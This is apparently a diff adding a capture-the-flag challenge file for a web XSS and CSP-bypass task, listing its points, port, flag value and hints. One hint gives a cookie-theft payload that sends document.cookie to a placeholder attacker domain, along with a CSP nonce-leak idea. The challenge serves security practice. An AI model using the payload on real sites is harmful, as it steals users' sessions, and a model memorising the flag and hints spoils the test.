@@ -1,0 +1,18 @@
+# xss-csp-bypass/challenge.yml
+name: XSS CSP Bypass
+category: Web
+value: 150
+description: |
+  home page echoes `?q=` inside a `<script>` tag and hides behind CSP +
+  naïve filter.
+dockerfile: Dockerfile
+ports:
+  - 5000/tcp
+flags:
+  - flag: flag{xss_csp}
+hints:
+  - content: "payload must be inline"
+  - content: "use `location='//yourdomain?'+document.cookie` + CSP nonce leak."
+tags:
+  - web
+  - xss
